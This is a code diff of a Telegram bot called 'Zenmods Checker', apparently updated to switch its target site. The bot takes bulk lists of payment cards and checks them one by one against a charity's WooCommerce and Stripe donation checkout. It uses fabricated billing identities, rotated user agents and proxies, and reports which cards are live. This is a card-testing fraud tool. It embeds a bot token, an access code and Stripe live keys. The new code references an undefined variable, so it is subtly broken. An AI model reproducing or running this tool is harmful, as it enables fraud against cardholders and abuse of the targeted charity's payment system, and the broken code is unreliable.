@@ -1,14 +1,10 @@
-from datetime import datetime, timedelta
-import io
-import os
+import json
 import random
 import re
 import string
-import threading
 import time
-from bs4 import BeautifulSoup
+from urllib.parse import quote_plus
 import requests
-import names
 import telebot
 
 TELEGRAM_BOT_TOKEN = "8664861867:AAF5Wq79aekFKDcE6vFT2jFO_3w4jjFgLmk"
@@ -16,147 +12,310 @@ SECRET_CODE = "Zenmods123"
 authorized_users = set()
 
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="Markdown")
-print_lock = threading.Lock()
 
-anasxzer00 = f"""
-Join Channel for new updates.
-"""
+HTTP_TIMEOUT = (10, 25)
 
-def mc_tools():
-    banner = anasxzer00
-    print_red(banner)
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+]
 
-def by_anasxzer00(text):
-    for char in text:
-        print(f'\033[91m{char}\033[0m', end='', flush=True)
-        time.sleep(0.03)
-    print()
+FIRST_NAMES = [
+    'James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard',
+    'Joseph', 'Thomas', 'Charles', 'Emily', 'Emma', 'Olivia', 'Ava',
+    'Isabella', 'Sophia', 'Mia', 'Charlotte', 'Amelia', 'Harper',
+]
+LAST_NAMES = [
+    'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller',
+    'Davis', 'Wilson', 'Taylor', 'Anderson', 'Thomas', 'Jackson', 'White',
+    'Harris', 'Martin', 'Thompson', 'Moore', 'Young', 'Allen',
+]
+STREETS = [
+    'Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Pine Rd', 'Elm St',
+    'Washington Blvd', 'Park Ave', 'Lake Dr', 'Hill Rd',
+]
+CITIES_STATES = [
+    ('Phoenix', 'AZ', '850'),
+    ('Los Angeles', 'CA', '900'),
+    ('Houston', 'TX', '770'),
+    ('Chicago', 'IL', '606'),
+    ('Dallas', 'TX', '752'),
+    ('San Antonio', 'TX', '782'),
+    ('San Diego', 'CA', '921'),
+    ('Jacksonville', 'FL', '322'),
+    ('Austin', 'TX', '787'),
+    ('Columbus', 'OH', '432'),
+]
 
-def print_line():
-    print_red(f"""|-|==========================================|-|""")
+STRIPE_PK = (
+    'pk_live_51RJd5fGlfOdBh4Nl2YUzFnY6zYb5IEAkHYSatP353K0wRioIydSEkrK'
+    'fWMrApQmyNrPafBOqLy4KQ4a5O3aVODi500IGgjyNG6'
+)
 
-def print_sline():
-    print_cyan(f"""|----------------------------------------------|""")
+ST1_CHARGED_RESPONSE = "Payment Success"
 
-def print_red(text): print(f"\033[91m{text}\033[0m")
-def print_green(text): print(f"\033[92m{text}\033[0m")
-def print_yellow(text): print(f"\033[93m{text}\033[0m")
-def print_blue(text): print(f"\033[94m{text}\033[0m")
-def print_magenta(text): print(f"\033[95m{text}\033[0m")
-def print_cyan(text): print(f"\033[96m{text}\033[0m")
-def print_white(text): print(f"\033[97m{text}\033[0m")
-def print_grey(text): print(f"\033[90m{text}\033[0m")
-
-def detectar_tipo_tarjeta(cc):
-    if cc.startswith("4"):
-        return "Visa"
-    elif cc.startswith("5"):
-        return "MasterCard"
-    elif cc.startswith("3"):
-        return "American Express"
-    elif cc.startswith("6"):
-        return "Discover"
+def classify_gate_response(text):
+    low = text.lower()
+    if any(k in low for k in ["succeeded", "success", "thank you", "order_id", "charged"]):
+        return "charged", "Payment Success", "charged"
+    elif any(k in low for k in ["insufficient_funds", "insufficient funds"]):
+        return "approved", "Your card has insufficient funds.", "insufficient_funds"
+    elif any(k in low for k in ["security_code", "cvc", "incorrect_cvc"]):
+        return "approved", "Your card's security code is incorrect.", "incorrect_cvc"
+    elif any(k in low for k in ["expired_card", "expiration"]):
+        return "declined", "Your card has expired.", "expired_card"
     else:
-        return "Desconocido"
+        return "declined", text[:100], "declined"
 
-def check_single_cc(cc_line):
+def _http_error(exc: requests.RequestException) -> dict:
+    low = str(exc).lower()
+    if isinstance(exc, requests.Timeout) or "timed out" in low:
+        return {"status": "ERROR", "response": "Request timed out", "time": "0s"}
+    return {"status": "ERROR", "response": str(exc)[:200], "time": "0s"}
+
+def _process_card_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> dict:
+    started = time.perf_counter()
+    if len(yy) == 2:
+        yy = "20" + yy[-2:]
+    mm = mm.zfill(2)
+
     try:
-        card = cc_line.replace('/', '|')
-        partes = card.split("|")
-        if len(partes) < 4:
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nReason: Invalid format structure"
-        
-        cc = partes[0]
-        mes = partes[1]
-        ano = partes[2]
-        if "20" in ano:
-            ano = ano.split("20")[1]
-        cvv = partes[3]
-
-        vendor = detectar_tipo_tarjeta(cc)
-        username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
-        correo_rand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
-        password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
+        user_agent = random.choice(USER_AGENTS)
+        first_name = random.choice(FIRST_NAMES)
+        last_name = random.choice(LAST_NAMES)
+        full_name = f"{first_name} {last_name}"
+        email_user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        email = f"{email_user}@gmail.com"
+        street_num = random.randint(100, 99999)
+        street = random.choice(STREETS)
+        address = f"{street_num} {street}"
+        city, state, zip_prefix = random.choice(CITIES_STATES)
+        zip_code = zip_prefix + str(random.randint(10, 99))
 
         session = requests.Session()
+        session.trust_env = False
+        if proxy_url:
+            session.proxies = {"http": proxy_url, "https": proxy_url}
 
-        # REQ1: Get Nonce from tfms.ro
-        headers = {
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
+        init_headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
+            'user-agent': user_agent,
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
         }
-        response = session.get('https://tfms.ro/membership-account/membership-checkout/', headers=headers, timeout=20)
-        if response.status_code != 200:
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: Checkout page GET failed (Status: {response.status_code})"
+        init_resp = session.get(
+            'https://forcesforchange.org/donate/',
+            headers=init_headers,
+            timeout=HTTP_TIMEOUT,
+        )
+        if init_resp.status_code >= 400:
+            elapsed = f"{time.perf_counter() - started:.2f}s"
+            return {
+                "status": "ERROR",
+                "response": f"Donate page HTTP {init_resp.status_code}",
+                "time": elapsed,
+            }
 
-        nonce_tag = (BeautifulSoup(response.text, 'html.parser')).find("input", {"name": "woocommerce-register-nonce"})
-        if not nonce_tag:
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: Register nonce not found"
+        product_id_match = (
+            re.search(r'["\']add-to-cart["\']\s*value=["\'](\d+)["\']', init_resp.text)
+            or re.search(r'\?add-to-cart=(\d+)', init_resp.text)
+            or re.search(r'"product_id"\s*:\s*(\d+)', init_resp.text)
+        )
+        product_id = product_id_match.group(1) if product_id_match else None
 
-        # REQ2: Stripe MUID/GUID/SID
-        headers = {
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
-        }
-        stripe_init = session.post('https://m.stripe.com/6', headers=headers, timeout=20).json()
-        muid = stripe_init.get('muid', '')
-        guid = stripe_init.get('guid', '')
-        sid = stripe_init.get('sid', '')
-
-        # REQ3: Stripe Tokenization
-        headers = {
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
-        }
-        data_token = f'time_on_page={random.randint(10,99999)}&pasted_fields=email&guid={guid}&muid={muid}&sid={sid}&key=pk_live_APZPK16BMAmVqyx5GXaAgfGh&payment_user_agent=stripe.js%2F78{random.randint(10000,99999)}e{random.randint(1,9)}%3B+stripe-js-v3%2F{random.randint(1,9)}c{random.randint(1000,9999)}{random.randint(1,9)}e{random.randint(1,9)}&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[cvc]={cvv}'
-
-        token_res = session.post('https://api.stripe.com/v1/tokens', headers=headers, data=data_token, timeout=20).json()
-        if 'id' not in token_res:
-            err_msg = token_res.get('error', {}).get('message', 'Unknown tokenization error')
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: {err_msg}"
-        
-        id_ = token_res['id']
-
-        # REQ4: Checkout Submission to tfms.ro
-        headers = {
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
-        }
-        data_checkout = {
-            'level': '2',
-            'checkjavascript': '1',
-            'username': username,
-            'password': password,
-            'password2': password,
-            'bemail': correo_rand,
-            'bconfirmemail': correo_rand,
-            'fullname': '',
-            'CardType': vendor,
-            'tos': '1',
-            'submit-checkout': '1',
-            'javascriptok': '1',
-            'stripeToken0': id_,
-            'AccountNumber': f'XXXXXXXXXXXX{cc[12:]}',
-            'ExpirationMonth': mes,
-            'ExpirationYear': ano,
-        }
-
-        checkout_res = session.post('https://tfms.ro/membership-account/membership-checkout/', headers=headers, data=data_checkout, timeout=20).text
-        response_code = (BeautifulSoup(checkout_res, 'html.parser')).find(class_="pmpro_message pmpro_error", id='pmpro_message')
-
-        error_message = response_code.get_text() if response_code else checkout_res
-
-        if "Your card's security code is incorrect." in error_message:
-            return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nStatus: Your card's security code is incorrect."
-        elif "Your card has insufficient funds." in error_message:
-            return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nStatus: Your card has insufficient funds."
-        elif "succeeded" in error_message or "pmpro_success" in checkout_res:
-            return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nStatus: CHARGE SUCCESSFUL!"
+        if product_id:
+            session.post(
+                'https://forcesforchange.org/',
+                params={'wc-ajax': 'add_to_cart'},
+                headers={
+                    'accept': 'application/json, text/javascript, */*; q=0.01',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'origin': 'https://forcesforchange.org',
+                    'referer': 'https://forcesforchange.org/donate/',
+                    'user-agent': user_agent,
+                    'x-requested-with': 'XMLHttpRequest',
+                },
+                data={'product_id': product_id, 'quantity': '1'},
+                timeout=HTTP_TIMEOUT,
+            )
         else:
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: {error_message.strip()}"
+            add_to_cart_match = re.search(
+                r'<form[^>]+class="[^"]*cart[^"]*"[^>]*>(.*?)</form>',
+                init_resp.text, re.DOTALL,
+            )
+            if add_to_cart_match:
+                inputs = re.findall(
+                    r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
+                    add_to_cart_match.group(1),
+                )
+                session.post(
+                    'https://forcesforchange.org/donate/',
+                    headers={
+                        'content-type': 'application/x-www-form-urlencoded',
+                        'origin': 'https://forcesforchange.org',
+                        'referer': 'https://forcesforchange.org/donate/',
+                        'user-agent': user_agent,
+                    },
+                    data=dict(inputs),
+                    timeout=HTTP_TIMEOUT,
+                )
 
-    except Exception as e:
-        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nReason: Exception -> {str(e)}"
+        checkout_page = session.get(
+            'https://forcesforchange.org/checkout/',
+            headers=init_headers,
+            timeout=HTTP_TIMEOUT,
+        )
+
+        nonce_match = (
+            re.search(r'"woocommerce-process-checkout-nonce"\s*value="([^"]+)"', checkout_page.text)
+            or re.search(r'"checkout_nonce"\s*:\s*"([^"]+)"', checkout_page.text)
+            or re.search(r'"woocommerce-process-checkout-nonce"\s*value="([^"]+)"', init_resp.text)
+            or re.search(r'"checkout_nonce"\s*:\s*"([^"]+)"', init_resp.text)
+        )
+        nonce = nonce_match.group(1) if nonce_match else '716ee815cf'
+
+        stripe_mid = session.cookies.get('__stripe_mid', 'c1ccf2d6-5b18-4fdc-a355-a6238ee7137bfb20e4')
+        stripe_sid = session.cookies.get('__stripe_sid', 'd75866ab-c96e-4246-a6f5-7ff152f406ebcef345')
+
+        stripe_headers = {
+            'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'user-agent': user_agent,
+        }
+
+        stripe_data = (
+            f'billing_details[name]={quote_plus(full_name)}'
+            f'&billing_details[email]={quote_plus(email)}'
+            f'&billing_details[address][city]={quote_plus(city)}'
+            '&billing_details[address][country]=US'
+            f'&billing_details[address][line1]={quote_plus(address)}'
+            '&billing_details[address][line2]='
+            f'&billing_details[address][postal_code]={zip_code}'
+            f'&billing_details[address][state]={state}'
+            '&type=card'
+            f'&card[number]={cc}'
+            f'&card[cvc]={cvv}'
+            f'&card[exp_year]={yy}'
+            f'&card[exp_month]={mm}'
+            '&allow_redisplay=unspecified'
+            f'&guid={stripe_mid}'
+            f'&muid={stripe_mid}'
+            f'&sid={stripe_sid}'
+            f'&key={STRIPE_PK}'
+        )
+
+        stripe_resp = session.post(
+            'https://api.stripe.com/v1/payment_methods',
+            headers=stripe_headers,
+            data=stripe_data,
+            timeout=HTTP_TIMEOUT,
+        )
+        try:
+            stripe_json = stripe_resp.json()
+        except Exception as je:
+            elapsed = f"{time.perf_counter() - started:.2f}s"
+            return {"status": "ERROR", "response": f"Stripe JSON error: {je}", "time": elapsed}
+
+        payment_method_id = stripe_json.get('id', '')
+        elapsed = f"{time.perf_counter() - started:.2f}s"
+
+        if not payment_method_id or not payment_method_id.startswith('pm_'):
+            err_msg = (
+                stripe_json.get('error', {}).get('message')
+                or stripe_json.get('error', {}).get('code')
+                or 'Stripe tokenization failed'
+            )
+            return {"status": "DECLINED", "response": err_msg, "time": elapsed}
+
+        checkout_headers = {
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://forcesforchange.org',
+            'referer': 'https://forcesforchange.org/donate/',
+            'user-agent': user_agent,
+            'x-requested-with': 'XMLHttpRequest',
+        }
+
+        checkout_data = (
+            f'billing_email={quote_plus(email)}'
+            f'&billing_first_name={quote_plus(first_name)}'
+            f'&billing_last_name={quote_plus(last_name)}'
+            '&billing_country=US'
+            f'&billing_address_1={quote_plus(address)}'
+            f'&billing_city={quote_plus(city)}'
+            f'&billing_state={state}'
+            f'&billing_postcode={zip_code}'
+            '&payment_method=stripe'
+            f'&woocommerce-process-checkout-nonce={nonce}'
+            f'&wc-stripe-payment-method={payment_method_id}'
+        )
+
+        checkout_resp = session.post(
+            'https://forcesforchange.org/',
+            params={'wc-ajax': 'checkout'},
+            headers=checkout_headers,
+            data=checkout_data,
+            timeout=HTTP_TIMEOUT,
+        )
+
+        elapsed = f"{time.perf_counter() - started:.2f}s"
+
+        try:
+            cj = checkout_resp.json()
+        except Exception:
+            return {
+                "status": "ERROR",
+                "response": checkout_resp.text[:200],
+                "time": elapsed,
+            }
+
+        if cj.get("result") == "success" or cj.get("redirect") or cj.get("order_id"):
+            return {
+                "status": "APPROVED",
+                "response": ST1_CHARGED_RESPONSE,
+                "time": elapsed,
+            }
+
+        msg = str(cj.get("messages") or cj.get("message") or cj.get("code") or "Declined")
+        clean = re.sub(r"<[^>]+>", "", msg).strip()
+        st, out_msg, _ = classify_gate_response(clean)
+        
+        if st in ["charged", "approved"]:
+            return {"status": "APPROVED", "response": out_msg or clean, "time": elapsed}
+        return {"status": "DECLINED", "response": out_msg or clean, "time": elapsed}
+
+    except requests.RequestException as exc:
+        elapsed = f"{time.perf_counter() - started:.2f}s"
+        err = _http_error(exc)
+        err["time"] = elapsed
+        return err
+    except Exception as exc:
+        elapsed = f"{time.perf_counter() - started:.2f}s"
+        return {"status": "ERROR", "response": str(exc)[:200], "time": elapsed}
+
+def check_single_cc(cc_str: str):
+    parts = cc_str.replace("/", "|").split("|")
+    if len(parts) < 4:
+        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_str}\nReason: Invalid format structure"
+    cc, mm, yy, cvc = [p.strip() for p in parts[:4]]
+    res = _process_card_sync(cc, mm, yy, cvc)
+    
+    status = res.get("status")
+    response_msg = res.get("response")
+    time_taken = res.get("time")
+
+    if status == "APPROVED":
+        return f"ZENMODS CHECKER ⚡\nApproved ✅\n{cc_str}\nResponse: {response_msg}\nTime: {time_taken}"
+    else:
+        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_str}\nReason: {response_msg}\nTime: {time_taken}"
 
 def process_bulk_file(chat_id, file_content):
     lines = [line.strip() for line in file_content.decode("utf-8").splitlines() if line.strip()]
@@ -166,7 +325,7 @@ def process_bulk_file(chat_id, file_content):
         bot.send_message(chat_id, "⚠️ File is empty or no cards found!")
         return
 
-    bot.send_message(chat_id, f"⚡ **Zenmods TFMS Sequential Engine** ⚡\nTotal cards: `{total_cards}`.\n🚀 Checking strictly 1 by 1 in real-time...")
+    bot.send_message(chat_id, f"⚡ **Zenmods ForcesForChange Engine** ⚡\nTotal cards: `{total_cards}`.\n🚀 Checking strictly 1 by 1 in real-time...")
 
     for index, card_line in enumerate(lines, start=1):
         res = check_single_cc(card_line)
@@ -177,7 +336,7 @@ def process_bulk_file(chat_id, file_content):
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.reply_to(message, "Welcome to Zenmods TFMS Checker Bot! Send /auth <code > to authorize or upload a text file.")
+    bot.reply_to(message, "Welcome to Zenmods ForcesForChange Checker Bot! Send /auth <code > to authorize or upload a text file.")
 
 @bot.message_handler(commands=['auth'])
 def authorize_user(message):
@@ -223,7 +382,4 @@ def handle_document(message):
         bot.reply_to(message, f"⚠️ Error processing file: {str(e)}")
 
 if __name__ == "__main__":
-    mc_tools()
-    print_line()
-    by_anasxzer00(' -- Zenmods Telegram Bot Engine Initialized Successfully!')
     bot.infinity_polling()
